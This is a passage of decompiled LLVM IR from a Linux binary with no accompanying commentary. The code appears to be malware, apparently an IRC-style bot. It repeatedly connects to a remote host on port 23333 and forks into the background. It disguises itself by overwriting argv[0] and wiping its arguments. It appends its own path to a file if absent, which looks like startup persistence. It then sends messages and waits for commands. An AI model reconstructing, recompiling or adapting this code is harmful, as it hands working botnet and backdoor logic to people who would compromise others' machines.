  %v0_80494f4 = load i32, i32* @global_var_8055e1c.289, align 4
  store i32 %v0_80494f4, i32* %stack_var_-60, align 4
  %v1_80494fc = call i32 @__GI_gethostbyname(i32 %v0_80494f4)
  %v4_8049504 = icmp eq i32 %v1_80494fc, 0
  %v1_8049508 = icmp eq i1 %v4_8049504, false
  br i1 %v1_8049508, label %dec_label_pc_8049526, label %dec_label_pc_804950a

dec_label_pc_804950a:                             ; preds = %dec_label_pc_80494f4
  store i32 0, i32* @global_var_8055e1c.289, align 4
  %v0_8049514 = load i32, i32* @global_var_8055e14.284, align 4
  store i32 %v0_8049514, i32* %stack_var_-60, align 4
  %v1_804951c = call i32 @__libc_close(i32 %v0_8049514)
  br label %dec_label_pc_8049460.backedge

dec_label_pc_8049460.backedge:                    ; preds = %dec_label_pc_804950a, %dec_label_pc_80496a9
  br label %dec_label_pc_8049460

dec_label_pc_8049526:                             ; preds = %dec_label_pc_80494f4
  %v1_8049529 = add i32 %v1_80494fc, 12
  %v2_8049529 = inttoptr i32 %v1_8049529 to i32*
  %v3_8049529 = load i32, i32* %v2_8049529, align 4
  %v1_8049537 = add i32 %v1_80494fc, 16
  %v2_8049537 = inttoptr i32 %v1_8049537 to i32*
  %v3_8049537 = load i32, i32* %v2_8049537, align 4
  %v1_804953a = inttoptr i32 %v3_8049537 to i32*
  %v2_804953a = load i32, i32* %v1_804953a, align 4
  store i32 %v2_804953a, i32* %stack_var_-60, align 4
  %v3_8049547 = call i32 @bcopy(i32 %v2_804953a, i32 %v2_8049531, i32 %v3_8049529)
  br label %dec_label_pc_804955e

dec_label_pc_804954e:                             ; preds = %dec_label_pc_80494e2
  %v0_804954e = load i32, i32* @global_var_8055e1c.289, align 4
  store i32 %v0_804954e, i32* %stack_var_-60, align 4
  %v1_8049556 = call i32 @inet_addr(i32 %v0_804954e)
  store i32 %v1_8049556, i32* %stack_var_-28, align 4
  br label %dec_label_pc_804955e

dec_label_pc_804955e:                             ; preds = %dec_label_pc_8049526, %dec_label_pc_804954e
  store i32 2, i32* %stack_var_-32, align 4
  store i32 23333, i32* %stack_var_-60, align 4
  %v2_804956b = call i32 @htons(i16 23333)
  %v0_8049577 = load i32, i32* @global_var_8055e14.284, align 4
  store i32 %v0_8049577, i32* %stack_var_-60, align 4
  %v3_804958f = call i32 @ioctl(i32 %v0_8049577, i32 21537, i32 %v2_804957d)
  store i32 0, i32* %stack_var_-60, align 4
  %v2_804959b = call i32 @__GI_time(i32* null)
  br label %dec_label_pc_8049691

dec_label_pc_80495a8:                             ; preds = %dec_label_pc_8049691
  %v1_80495a8 = call i32 @__errno_location(i32 %v2_804959b)
  %v1_80495ad = inttoptr i32 %v1_80495a8 to i32*
  store i32 0, i32* %v1_80495ad, align 4
  %v0_80495b6 = load i32, i32* @global_var_8055e14.284, align 4
  store i32 %v0_80495b6, i32* %stack_var_-60, align 4
  %v3_80495cb = call i32 @__libc_connect(i32 %v0_80495b6, i32 %v2_804952e, i32 16)
  %v1_80495d0 = icmp eq i32 %v3_80495cb, 0
  br i1 %v1_80495d0, label %dec_label_pc_80495e4, label %dec_label_pc_80495d4

dec_label_pc_80495d4:                             ; preds = %dec_label_pc_80495a8
  %v0_80495d4 = load i32, i32* %stack_var_-60, align 4
  %v1_80495d4 = call i32 @__errno_location(i32 %v0_80495d4)
  %v1_80495d9 = inttoptr i32 %v1_80495d4 to i32*
  %v2_80495d9 = load i32, i32* %v1_80495d9, align 4
  %v9_80495db = icmp eq i32 %v2_80495d9, 106
  %v1_80495de = icmp eq i1 %v9_80495db, false
  br i1 %v1_80495de, label %dec_label_pc_804966d, label %dec_label_pc_80495e4

dec_label_pc_80495e4:                             ; preds = %dec_label_pc_80495d4, %dec_label_pc_80495a8
  %v0_80495e4 = load i32, i32* @global_var_8055e14.284, align 4
  store i32 %v0_80495e4, i32* %stack_var_-60, align 4
  %v5_804960c = call i32 @__GI_setsockopt(i32 %v0_80495e4, i32 1, i32 13, i32 0, i32 0)
  %v0_8049611 = load i32, i32* @global_var_8055e14.284, align 4
  store i32 %v0_8049611, i32* %stack_var_-60, align 4
  %v5_8049639 = call i32 @__GI_setsockopt(i32 %v0_8049611, i32 1, i32 2, i32 0, i32 0)
  %v0_804963e = load i32, i32* @global_var_8055e14.284, align 4
  store i32 %v0_804963e, i32* %stack_var_-60, align 4
  %v5_8049666 = call i32 @__GI_setsockopt(i32 %v0_804963e, i32 1, i32 9, i32 0, i32 0)
  %v2_80496c5 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80496c5, i32* @ebp, align 4
  ret i32 %v5_8049666

dec_label_pc_804966d:                             ; preds = %dec_label_pc_80495d4
  %v0_804966d = load i32, i32* %stack_var_-60, align 4
  %v1_804966d = call i32 @__errno_location(i32 %v0_804966d)
  %v1_8049672 = inttoptr i32 %v1_804966d to i32*
  %v2_8049672 = load i32, i32* %v1_8049672, align 4
  %v9_8049674 = icmp eq i32 %v2_8049672, 115
  br i1 %v9_8049674, label %dec_label_pc_8049685, label %dec_label_pc_8049679

dec_label_pc_8049679:                             ; preds = %dec_label_pc_804966d
  %v0_8049679 = load i32, i32* %stack_var_-60, align 4
  %v1_8049679 = call i32 @__errno_location(i32 %v0_8049679)
  %v1_804967e = inttoptr i32 %v1_8049679 to i32*
  %v2_804967e = load i32, i32* %v1_804967e, align 4
  %v9_8049680 = icmp eq i32 %v2_804967e, 114
  %v1_8049683 = icmp eq i1 %v9_8049680, false
  br i1 %v1_8049683, label %dec_label_pc_80496a9, label %dec_label_pc_8049685

dec_label_pc_8049685:                             ; preds = %dec_label_pc_8049679, %dec_label_pc_804966d
  store i32 1, i32* %stack_var_-60, align 4
  %v1_804968c = call i32 @sleep(i32 1)
  br label %dec_label_pc_8049691

dec_label_pc_8049691:                             ; preds = %dec_label_pc_804955e, %dec_label_pc_8049685
  store i32 0, i32* %stack_var_-60, align 4
  %v2_8049698 = call i32 @__GI_time(i32* null)
  %v5_804969d = sub i32 %v2_8049698, %v2_804959b
  %tmp = icmp ult i32 %v5_804969d, 10
  br i1 %tmp, label %dec_label_pc_80495a8, label %dec_label_pc_80496a9

dec_label_pc_80496a9:                             ; preds = %dec_label_pc_8049679, %dec_label_pc_8049691
  store i32 0, i32* @global_var_8055e1c.289, align 4
  %v0_80496b3 = load i32, i32* @global_var_8055e14.284, align 4
  store i32 %v0_80496b3, i32* %stack_var_-60, align 4
  %v1_80496bb = call i32 @__libc_close(i32 %v0_80496b3)
  br label %dec_label_pc_8049460.backedge

; uselistorder directives
  uselistorder i32 %v2_804959b, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i32* %stack_var_-60, { 3, 4, 5, 2, 1, 6, 7, 8, 0, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32 (i32)* @sleep, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @bcopy, { 2, 1, 0 }
  uselistorder i32 (i32)* @__GI_gethostbyname, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_80496a9, { 1, 0 }
  uselistorder label %dec_label_pc_8049691, { 1, 0 }
  uselistorder label %dec_label_pc_804955e, { 1, 0 }
  uselistorder label %dec_label_pc_8049460.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_804949d, { 1, 0 }
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i8*, align 4
  %stack_var_-2712 = alloca i32, align 4
  %stack_var_-6808 = alloca i32, align 4
  %stack_var_-408 = alloca i32, align 4
  %stack_var_-398 = alloca i32, align 4
  %stack_var_-1688 = alloca i32, align 4
  %stack_var_-664 = alloca i32, align 4
  %stack_var_-512 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %stack_var_-6864 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  %v2_80496c7 = ptrtoint i32* %stack_var_4 to i32
  store i32 %v2_80496c7, i32* %edx.global-to-local, align 4
  store i32 ptrtoint ([19 x i8]* @global_var_8051438.290 to i32), i32* @eax, align 4
  store i32 ptrtoint ([19 x i8]* @global_var_8051438.290 to i32), i32* %stack_var_-6864, align 4
  %v2_8049707 = call i32 @__GI_fopen(i32 ptrtoint ([19 x i8]* @global_var_8051438.290 to i32), i32 ptrtoint (i32* @global_var_8051330.258 to i32))
  %v4_804970f = icmp eq i32 %v2_8049707, 0
  %v1_8049713 = icmp eq i1 %v4_804970f, false
  br i1 %v1_8049713, label %dec_label_pc_8049732, label %dec_label_pc_8049715

dec_label_pc_8049715:                             ; preds = %entry
  store i32 ptrtoint ([13 x i8]* @global_var_805144b.291 to i32), i32* @eax, align 4
  store i32 ptrtoint ([13 x i8]* @global_var_805144b.291 to i32), i32* %stack_var_-6864, align 4
  %v2_804972a = call i32 @__GI_fopen(i32 ptrtoint ([13 x i8]* @global_var_805144b.291 to i32), i32 ptrtoint (i32* @global_var_8051330.258 to i32))
  br label %dec_label_pc_8049732

dec_label_pc_8049732:                             ; preds = %entry, %dec_label_pc_8049715
  %stack_var_-80.0 = phi i32 [ %v2_8049707, %entry ], [ %v2_804972a, %dec_label_pc_8049715 ]
  %stack_var_-84.0 = phi i8* [ getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_8051438.290, i32 0, i32 0), %entry ], [ getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805144b.291, i32 0, i32 0), %dec_label_pc_8049715 ]
  %v4_8049732 = icmp eq i32 %stack_var_-80.0, 0
  br i1 %v4_8049732, label %dec_label_pc_80498d4, label %dec_label_pc_804973c

dec_label_pc_804973c:                             ; preds = %dec_label_pc_8049732
  %v1_8049742 = add i32 %v2_80496c7, 4
  %v2_8049742 = inttoptr i32 %v1_8049742 to i32*
  %v3_8049742 = load i32, i32* %v2_8049742, align 4
  %v1_8049745 = inttoptr i32 %v3_8049742 to i32*
  %v2_8049745 = load i32, i32* %v1_8049745, align 4
  store i1 false, i1* @df, align 1
  %v4_8049755 = inttoptr i32 %v2_8049745 to i8*
  store i32 %v2_8049745, i32* @edi, align 4
  %v3_804975b = call i32 @_strlen(i8* %v4_8049755)
  %v2_8049774 = ptrtoint i32* %stack_var_-348 to i32
  store i32 %v2_8049774, i32* %stack_var_-6864, align 4
  %v2_804977d = call i32 @getcwd(i32 %v2_8049774, i32 256)
  store i1 false, i1* @df, align 1
  %v4_80497a3 = bitcast i32* %stack_var_-348 to i8*
  store i32 %v2_8049774, i32* @esi, align 4
  store i32 ptrtoint (i8** @global_var_8051458.292 to i32), i32* @edi, align 4
  %v7_80497b5 = call i32 @_strncmp(i8* %v4_80497a3, i8* bitcast (i8** @global_var_8051458.292 to i8*), i32 2)
  %v8_80497b5 = urem i32 %v7_80497b5, 2
  %v9_80497b5 = icmp eq i32 %v8_80497b5, 0
  %v0_80497b7 = load i1, i1* @cf, align 1
  %v2_80497b7 = or i1 %v0_80497b7, %v9_80497b5
  %v3_80497b7 = zext i1 %v2_80497b7 to i32
  %v4_80497b7 = load i32, i32* @edx, align 4
  %v5_80497b7 = and i32 %v4_80497b7, -256
  %v6_80497b7 = or i32 %v3_80497b7, %v5_80497b7
  %v7_80497b7 = xor i32 %v6_80497b7, 1
  store i32 %v7_80497b7, i32* %edx.global-to-local, align 4
  %v5_80497ba = ptrtoint i32* %stack_var_-512 to i32
  %v3_80497bd = and i32 %v7_80497b5, -256
  %v1_80497bf = trunc i32 %v7_80497b7 to i8
  %v3_80497bf = trunc i32 %v5_80497ba to i8
  %v4_80497bf = sub i8 %v1_80497bf, %v3_80497bf
  %v15_80497bf = icmp eq i8 %v4_80497bf, 0
  %v20_80497bf = zext i8 %v4_80497bf to i32
  %v23_80497bf = or i32 %v20_80497bf, %v3_80497bd
  store i32 %v23_80497bf, i32* @ecx, align 4
  br i1 %v15_80497bf, label %dec_label_pc_80498c9, label %dec_label_pc_80497d3

dec_label_pc_80497d0:                             ; preds = %dec_label_pc_80497d3
  %v4_80497d0 = add i32 %stack_var_-64.0, -1
  br label %dec_label_pc_80497d3

dec_label_pc_80497d3:                             ; preds = %dec_label_pc_804973c, %dec_label_pc_80497d0
  %stack_var_-64.0 = phi i32 [ %v4_80497d0, %dec_label_pc_80497d0 ], [ %v3_804975b, %dec_label_pc_804973c ]
  store i32 %v2_80496c7, i32* @esi, align 4
  %v3_80497d9 = load i32, i32* %v2_8049742, align 4
  %v1_80497dc = inttoptr i32 %v3_80497d9 to i32*
  %v2_80497dc = load i32, i32* %v1_80497dc, align 4
  store i32 %v2_80497dc, i32* %edx.global-to-local, align 4
  %v2_80497e1 = add i32 %v2_80497dc, %stack_var_-64.0
  %v1_80497e4 = inttoptr i32 %v2_80497e1 to i8*
  %v2_80497e4 = load i8, i8* %v1_80497e4, align 1
  %v10_80497e7 = icmp eq i8 %v2_80497e4, 47
  %v1_80497e9 = icmp eq i1 %v10_80497e7, false
  br i1 %v1_80497e9, label %dec_label_pc_80497d0, label %dec_label_pc_80497eb

dec_label_pc_80497eb:                             ; preds = %dec_label_pc_80497d3
  store i32 %v2_80496c7, i32* @edi, align 4
  %v3_80497f1 = load i32, i32* %v2_8049742, align 4
  %v1_80497f4 = inttoptr i32 %v3_80497f1 to i32*
  %v2_80497f4 = load i32, i32* %v1_80497f4, align 4
  store i32 %v2_80497f4, i32* %edx.global-to-local, align 4
  %v2_80497f9 = add i32 %v2_80497f4, %stack_var_-64.0
  %v2_8049812 = ptrtoint i32* %stack_var_-664 to i32
  store i32 %v2_8049812, i32* %stack_var_-6864, align 4
  %v4_804981b = call i32 @sprintf(i32 %v2_8049812, i32 ptrtoint ([8 x i8]* @global_var_805145a.293 to i32), i32 %v2_8049774, i32 %v2_80497f9)
  %v1_8049864 = inttoptr i32 %stack_var_-80.0 to i16*
  %v2_8049831 = ptrtoint i32* %stack_var_-1688 to i32
  %v2_8049852 = bitcast i32* %stack_var_-1688 to i8*
  br label %dec_label_pc_804985e.outer

dec_label_pc_8049822:                             ; preds = %dec_label_pc_804985e
  store i32 %v2_8049831, i32* %stack_var_-6864, align 4
  %v3_804983a = call i32 @fgets(i32 %v2_8049831, i32 1024, i32 %stack_var_-80.0)
  store i32 %v2_8049831, i32* %stack_var_-6864, align 4
  %v3_8049852 = call i32 @__GI_strcasecmp(i8* %v2_8049852, i32 %v2_8049812)
  %v1_8049857 = icmp eq i32 %v3_8049852, 0
  %v1_8049859 = icmp eq i1 %v1_8049857, false
  br i1 %v1_8049859, label %dec_label_pc_804985e, label %dec_label_pc_804985b

dec_label_pc_804985b:                             ; preds = %dec_label_pc_8049822
  %v4_804985b = add i32 %stack_var_-60.0.ph, 1
  br label %dec_label_pc_804985e.outer

dec_label_pc_804985e.outer:                       ; preds = %dec_label_pc_804985b, %dec_label_pc_80497eb
  %stack_var_-60.0.ph = phi i32 [ %v4_804985b, %dec_label_pc_804985b ], [ 0, %dec_label_pc_80497eb ]
  br label %dec_label_pc_804985e

dec_label_pc_804985e:                             ; preds = %dec_label_pc_804985e.outer, %dec_label_pc_8049822
  store i32 %stack_var_-80.0, i32* %stack_var_-6864, align 4
  %v2_8049864 = call i32 @feof(i16* %v1_8049864)
  %v1_8049869 = icmp eq i32 %v2_8049864, 0
  br i1 %v1_8049869, label %dec_label_pc_8049822, label %dec_label_pc_804986d

dec_label_pc_804986d:                             ; preds = %dec_label_pc_804985e
  %v4_804986d = icmp eq i32 %stack_var_-60.0.ph, 0
  %v1_8049871 = icmp eq i1 %v4_804986d, false
  store i32 %stack_var_-80.0, i32* @eax, align 4
  store i32 %stack_var_-80.0, i32* %stack_var_-6864, align 4
  %v2_80498c2 = call i32 @__GI_fclose(i16* %v1_8049864)
  br i1 %v1_8049871, label %dec_label_pc_80498d4, label %dec_label_pc_8049873

dec_label_pc_8049873:                             ; preds = %dec_label_pc_804986d
  %v4_8049886 = ptrtoint i8* %stack_var_-84.0 to i32
  store i32 %v4_8049886, i32* @eax, align 4
  store i32 %v4_8049886, i32* %stack_var_-6864, align 4
  %v2_804988c = call i32 @__GI_fopen(i32 %v4_8049886, i32 ptrtoint (i32* @global_var_8051462.294 to i32))
  %v4_8049894 = icmp eq i32 %v2_804988c, 0
  br i1 %v4_8049894, label %dec_label_pc_80498d4, label %dec_label_pc_804989a

dec_label_pc_804989a:                             ; preds = %dec_label_pc_8049873
  store i32 %v2_8049812, i32* %stack_var_-6864, align 4
  %v2_80498aa = call i32 @__GI_fputs(i32 %v2_8049812, i32 %v2_804988c)
  store i32 %v2_804988c, i32* @eax, align 4
  store i32 %v2_804988c, i32* %stack_var_-6864, align 4
  %v1_80498b5 = inttoptr i32 %v2_804988c to i16*
  %v2_80498b5 = call i32 @__GI_fclose(i16* %v1_80498b5)
  br label %dec_label_pc_80498d4

dec_label_pc_80498c9:                             ; preds = %dec_label_pc_804973c
  store i32 %stack_var_-80.0, i32* @eax, align 4
  store i32 %stack_var_-80.0, i32* %stack_var_-6864, align 4
  %v1_80498cf = inttoptr i32 %stack_var_-80.0 to i16*
  %v2_80498cf = call i32 @__GI_fclose(i16* %v1_80498cf)
  br label %dec_label_pc_80498d4

dec_label_pc_80498d4:                             ; preds = %dec_label_pc_804986d, %dec_label_pc_8049873, %dec_label_pc_8049732, %dec_label_pc_804989a, %dec_label_pc_80498c9
  %v0_80498d4 = call i32 @__libc_fork()
  store i32 %v0_80498d4, i32* @eax, align 4
  %v1_80498d9 = icmp eq i32 %v0_80498d4, 0
  br i1 %v1_80498d9, label %dec_label_pc_80498e9, label %dec_label_pc_80498dd

dec_label_pc_80498dd:                             ; preds = %dec_label_pc_80498d4
  store i32 0, i32* %stack_var_-6864, align 4
  %v1_80498e4 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_80498e9

dec_label_pc_80498e9:                             ; preds = %dec_label_pc_80498d4, %dec_label_pc_80498dd
  store i32 %v2_80496c7, i32* %edx.global-to-local, align 4
  %v1_80498ef = add i32 %v2_80496c7, 4
  %v2_80498ef = inttoptr i32 %v1_80498ef to i32*
  %v3_80498ef = load i32, i32* %v2_80498ef, align 4
  %v1_80498f2 = inttoptr i32 %v3_80498ef to i32*
  %v2_80498f2 = load i32, i32* %v1_80498f2, align 4
  store i1 false, i1* @df, align 1
  %v4_8049902 = inttoptr i32 %v2_80498f2 to i8*
  store i32 %v2_80498f2, i32* @edi, align 4
  %v3_8049908 = call i32 @_strlen(i8* %v4_8049902)
  store i32 %v3_8049908, i32* %edx.global-to-local, align 4
  %v3_8049917 = load i32, i32* %v2_80498ef, align 4
  %v1_804991a = inttoptr i32 %v3_8049917 to i32*
  %v2_804991a = load i32, i32* %v1_804991a, align 4
  store i32 %v2_804991a, i32* %stack_var_-6864, align 4
  %v3_804992b = inttoptr i32 %v2_804991a to i8*
  %v4_804992b = call i32 @strncpy(i8* %v3_804992b, i32 ptrtoint ([14 x i8]* @global_var_8051464.295 to i32), i32 %v3_8049908)
  br label %dec_label_pc_8049984

dec_label_pc_8049939:                             ; preds = %dec_label_pc_8049984
  %v2_804993c = mul i32 %storemerge13, 4
  %v4_8049945 = load i32, i32* %v2_80498ef, align 4
  %v5_8049945 = add i32 %v4_8049945, %v2_804993c
  %v1_8049948 = inttoptr i32 %v5_8049945 to i32*
  %v2_8049948 = load i32, i32* %v1_8049948, align 4
  %v4_8049958 = inttoptr i32 %v2_8049948 to i8*
  %v3_804995e = call i32 @_strlen(i8* %v4_8049958)
  store i32 %v3_804995e, i32* %edx.global-to-local, align 4
  %v4_8049973 = load i32, i32* %v2_80498ef, align 4
  %v5_8049973 = add i32 %v4_8049973, %v2_804993c
  %v1_8049976 = inttoptr i32 %v5_8049973 to i32*
  %v2_8049976 = load i32, i32* %v1_8049976, align 4
  %v1_8049978 = inttoptr i32 %v2_8049976 to i8*
  store i32 %v2_8049976, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_804997d = and i32 %v2_8049976, -256
  %v5_804997f = call i8* @_memset(i8* %v1_8049978, i32 %v1_804997d, i32 %v3_804995e)
  %v4_8049981 = add i32 %storemerge13, 1
  br label %dec_label_pc_8049984

dec_label_pc_8049984:                             ; preds = %dec_label_pc_80498e9, %dec_label_pc_8049939
  %storemerge13 = phi i32 [ %v4_8049981, %dec_label_pc_8049939 ], [ 1, %dec_label_pc_80498e9 ]
  store i32 %v2_80496c7, i32* @esi, align 4
  %v3_804998d = load i32, i32* %stack_var_4, align 4
  %v5_804998f = icmp slt i32 %storemerge13, %v3_804998d
  br i1 %v5_804998f, label %dec_label_pc_8049939, label %dec_label_pc_8049991

dec_label_pc_8049991:                             ; preds = %dec_label_pc_8049984
  store i32 0, i32* %stack_var_-6864, align 4
  %v2_8049998 = call i32 @__GI_time(i32* null)
  store i32 %v2_8049998, i32* @ebx, align 4
  %v0_804999f = call i32 @__libc_getpid()
  %v0_80499a4 = load i32, i32* @ebx, align 4
  %v2_80499a4 = xor i32 %v0_80499a4, %v0_804999f
  store i32 %v2_80499a4, i32* @ebx, align 4
  %v0_80499a6 = load i32, i32* %stack_var_-6864, align 4
  %v1_80499a6 = call i32 @getppid(i32 %v0_80499a6)
  %v0_80499ab = load i32, i32* @ebx, align 4
  %v2_80499ab = add i32 %v0_80499ab, %v1_80499a6
  store i32 %v2_80499ab, i32* @eax, align 4
  store i32 %v2_80499ab, i32* %stack_var_-6864, align 4
  %v1_80499b1 = call i32 @srand(i32 %v2_80499ab)
  store i32 %v1_80499b1, i32* @eax, align 4
  %v2_80499bd = call i32 @makestring(i32 ptrtoint ([14 x i8]* @global_var_805140d.283 to i32))
  %v2_80499cc = ptrtoint i32* %stack_var_-398 to i32
  store i32 %v2_80499cc, i32* @eax, align 4
  store i32 %v2_80499cc, i32* %stack_var_-6864, align 4
  %v2_80499d5 = bitcast i32* %stack_var_-398 to i8*
  %v3_80499d5 = call i32 @strcpy(i8* %v2_80499d5, i32 ptrtoint ([14 x i8]* @global_var_805140d.283 to i32))
  store i32 %v2_80499cc, i32* %stack_var_-6864, align 4
  %v3_80499ea = call i32 @strcat(i8* %v2_80499d5, i32 %v2_80499bd)
  store i32 %v2_80499cc, i32* @eax, align 4
  store i32 %v2_80499cc, i32* @global_var_8055e10.268, align 16
  %v0_80499fa = load i32, i32* %stack_var_-6864, align 4
  %v1_80499fa = call i32 @makestring(i32 %v0_80499fa)
  store i32 %v1_80499fa, i32* @eax, align 4
  store i32 %v1_80499fa, i32* @global_var_8055e08.260, align 8
  %v0_8049a04 = load i32, i32* %stack_var_-6864, align 4
  %v1_8049a04 = call i32 @makestring(i32 %v0_8049a04)
  store i32 %v1_8049a04, i32* @global_var_8055e18.296, align 8
  store i32 ptrtoint (i32* @global_var_8051472.297 to i32), i32* @global_var_8055e28.263, align 8
  store i32 ptrtoint (i32* @global_var_8051474.298 to i32), i32* @global_var_8055e24.274, align 4
  store i32 ptrtoint (i32* @global_var_8051474.298 to i32), i32* @global_var_8055e0c.299, align 4
  store i32 0, i32* @global_var_8055e1c.289, align 4
  %v2_8049a9b = ptrtoint i32* %stack_var_-664 to i32
  %tmp91 = bitcast i32* %stack_var_-664 to i8*
  %v2_8049ae0 = ptrtoint i32* %stack_var_-408 to i32
  %v2_8049c5e = ptrtoint i32* %stack_var_-6808 to i32
  %v2_8049d30 = ptrtoint i32* %stack_var_-2712 to i32
  %v2_8049d89 = ptrtoint i32* %stack_var_-1688 to i32
  %v2_8049d92 = bitcast i32* %stack_var_-1688 to i8*
  %tmp92 = bitcast i8** %stack_var_-32 to i32*
  %v2_8049d13 = bitcast i32* %stack_var_-2712 to i8*
  br label %dec_label_pc_8049a38

dec_label_pc_8049a38:                             ; preds = %dec_label_pc_8049c49, %dec_label_pc_8049a91, %dec_label_pc_8049e0d, %dec_label_pc_8049991
  %v0_8049a38 = call i32 @con()
  %v0_8049a3d = load i32, i32* @global_var_8055e0c.299, align 4
  %v0_8049a42 = load i32, i32* @global_var_8055e14.284, align 4
  store i32 %v0_8049a42, i32* %edx.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_8051475.300 to i32), i32* %stack_var_-6864, align 4
  %v3_8049a57 = call i32 @Send(i32 %v0_8049a42, i32 ptrtoint ([9 x i8]* @global_var_8051475.300 to i32), i32 %v0_8049a3d)
  %v0_8049a61 = load i32, i32* @global_var_8055e08.260, align 8
  store i32 %v0_8049a61, i32* %edx.global-to-local, align 4
  %v0_8049a67 = load i32, i32* @global_var_8055e10.268, align 16
  %v0_8049a6d = load i32, i32* @global_var_8055e14.284, align 4
  store i32 %v0_8049a6d, i32* @ebx, align 4
  store i32 ptrtoint ([41 x i8]* @global_var_8051480.301 to i32), i32* %stack_var_-6864, align 4
  %v3_8049a8a = call i32 @Send(i32 %v0_8049a6d, i32 ptrtoint ([41 x i8]* @global_var_8051480.301 to i32), i32 %v0_8049a67)
  br label %dec_label_pc_8049a91

dec_label_pc_8049a91:                             ; preds = %dec_label_pc_8049c24, %dec_label_pc_8049c7d, %dec_label_pc_8049e2b, %dec_label_pc_8049e4c, %dec_label_pc_8049a38
  store i32 %v2_8049a9b, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_8049aa2 = call i8* @_memset(i8* %tmp91, i32 0, i32 32)
  %v0_8049aaa = load i32, i32* @global_var_8055e14.284, align 4
  %v2_8049ab1 = udiv i32 %v0_8049aaa, 32
  store i32 %v2_8049ab1, i32* %edx.global-to-local, align 4
  %v1_8049ab9 = urem i32 %v0_8049aaa, 32
  %v0_8049abc = load i32, i32* @ebp, align 4
  %v2_8049abc = mul nuw nsw i32 %v2_8049ab1, 4
  %v3_8049abc = add nsw i32 %v2_8049abc, -656
  %v4_8049abc = add i32 %v3_8049abc, %v0_8049abc
  %v5_8049abc = inttoptr i32 %v4_8049abc to i32*
  %v6_8049abc = load i32, i32* %v5_8049abc, align 4
  %v9_8049abc = shl i32 1, %v1_8049ab9
  %v12_8049abc = or i32 %v6_8049abc, %v9_8049abc
  store i32 %v12_8049abc, i32* %v5_8049abc, align 4
  store i32 1200, i32* %stack_var_-408, align 4
  %v0_8049ad8 = load i32, i32* @global_var_8055e14.284, align 4
  %v1_8049add = add i32 %v0_8049ad8, 1
  store i32 %v1_8049add, i32* %edx.global-to-local, align 4
  store i32 %v2_8049a9b, i32* %stack_var_-6864, align 4
  %v5_8049b07 = call i32 @__libc_select(i32 %v1_8049add, i32 %v2_8049a9b, i32 0, i32 0, i32 %v2_8049ae0)
  %tmp93 = icmp slt i32 %v5_8049b07, 1
  br i1 %tmp93, label %dec_label_pc_8049a38, label %dec_label_pc_8049c16.preheader

dec_label_pc_8049c16.preheader:                   ; preds = %dec_label_pc_8049a91
  %v0_8049c16115 = load i32, i32* @global_var_8053790.256, align 16
  %v10_8049c1b117 = icmp eq i32 %v0_8049c16115, 0
  br i1 %v10_8049c1b117, label %dec_label_pc_8049c24, label %dec_label_pc_8049b20

dec_label_pc_8049b20:                             ; preds = %dec_label_pc_8049c16.preheader, %dec_label_pc_8049c13
  %storemerge10124 = phi i32 [ %.pre, %dec_label_pc_8049c13 ], [ 0, %dec_label_pc_8049c16.preheader ]
  %v2_8049b23 = mul i32 %storemerge10124, 4
  store i32 %v2_8049b23, i32* %edx.global-to-local, align 4
  %v0_8049b28 = load i32, i32* @global_var_8055e2c.257, align 4
  %v2_8049b2d = add i32 %v0_8049b28, %v2_8049b23
  %v1_8049b30 = inttoptr i32 %v2_8049b2d to i32*
  %v2_8049b30 = load i32, i32* %v1_8049b30, align 4
  store i32 0, i32* %stack_var_-6864, align 4
  %v3_8049b45 = call i32 @__libc_waitpid(i32 %v2_8049b30, i32 0, i32 1)
  %tmp94 = icmp slt i32 %v3_8049b45, 1
  %.pre = add i32 %storemerge10124, 1
  br i1 %tmp94, label %dec_label_pc_8049c13, label %dec_label_pc_8049b52

dec_label_pc_8049b52:                             ; preds = %dec_label_pc_8049b20
  %v0_8049b8598 = load i32, i32* @global_var_8053790.256, align 16
  %v10_8049b8a99 = icmp ult i32 %.pre, %v0_8049b8598
  %v2_8049b5e100 = mul i32 %.pre, 4
  store i32 %v2_8049b5e100, i32* %edx.global-to-local, align 4
  %v0_8049b63101 = load i32, i32* @global_var_8055e2c.257, align 4
  %v2_8049b68102 = add i32 %v0_8049b63101, %v2_8049b5e100
  %v1_8049b6b103 = add i32 %v2_8049b68102, -4
  br i1 %v10_8049b8a99, label %dec_label_pc_8049b5b, label %dec_label_pc_8049b8f

dec_label_pc_8049b5b:                             ; preds = %dec_label_pc_8049b52, %dec_label_pc_8049b5b
  %v1_8049b6b107 = phi i32 [ %v1_8049b6b, %dec_label_pc_8049b5b ], [ %v1_8049b6b103, %dec_label_pc_8049b52 ]
  %v2_8049b68106 = phi i32 [ %v2_8049b68, %dec_label_pc_8049b5b ], [ %v2_8049b68102, %dec_label_pc_8049b52 ]
  %v2_8049b5e105 = phi i32 [ %v2_8049b5e, %dec_label_pc_8049b5b ], [ %v2_8049b5e100, %dec_label_pc_8049b52 ]
  %storemerge12104 = phi i32 [ %v4_8049b82, %dec_label_pc_8049b5b ], [ %.pre, %dec_label_pc_8049b52 ]
  store i32 %v2_8049b5e105, i32* %edx.global-to-local, align 4
  %v1_8049b7e = inttoptr i32 %v2_8049b68106 to i32*
  %v2_8049b7e = load i32, i32* %v1_8049b7e, align 4
  %v2_8049b80 = inttoptr i32 %v1_8049b6b107 to i32*
  store i32 %v2_8049b7e, i32* %v2_8049b80, align 4
  %v4_8049b82 = add i32 %storemerge12104, 1
  %v0_8049b85 = load i32, i32* @global_var_8053790.256, align 16
  %v10_8049b8a = icmp ult i32 %v4_8049b82, %v0_8049b85
